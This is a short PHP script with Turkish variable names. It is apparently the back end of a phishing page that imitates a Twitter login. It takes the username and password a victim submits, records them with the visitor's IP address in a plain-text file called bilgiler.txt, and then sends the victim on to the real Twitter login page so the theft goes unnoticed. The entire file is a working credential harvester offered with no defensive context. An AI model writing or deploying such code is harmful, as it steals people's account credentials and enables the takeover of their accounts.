<?php 

$kullaniciadi = $_POST['Username'];
$sifre = $_POST['Password'];
$ip =$_SERVER["REMOTE_ADDR"];

$dosya = fopen ("bilgiler.txt" , 'a'); 
$yaz="Username:  ". $kullaniciadi . "   Password: " .$sifre."   IP: ".$ip."\n";
fwrite ( $dosya , $yaz ) ;
fclose ($dosya);

header("Location: https://twitter.com/i/flow/login");
die();

 ?>